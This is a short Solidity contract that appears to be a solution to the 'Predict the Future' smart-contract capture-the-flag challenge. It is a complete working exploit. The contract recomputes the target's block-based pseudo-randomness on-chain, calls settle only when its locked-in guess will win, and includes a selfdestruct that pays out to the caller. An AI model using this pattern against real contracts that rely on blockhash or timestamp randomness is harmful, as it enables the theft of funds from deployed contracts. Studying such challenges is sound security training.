pragma solidity ^0.4.21;
import './PredictTheFutureChallenge.sol';

contract Solution{
  function lockInGuess(address _address, uint8 myGuess) public payable{
    PredictTheFutureChallenge cte = PredictTheFutureChallenge(_address);
    cte.lockInGuess.value(msg.value)(myGuess);
  }

  function settle(address _address, uint8 myGuess) public{
    uint8 test = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

    require(test == myGuess);
    PredictTheFutureChallenge cte = PredictTheFutureChallenge(_address);
    cte.settle();
  }

  function destroy() public{
    selfdestruct(msg.sender);
  }
}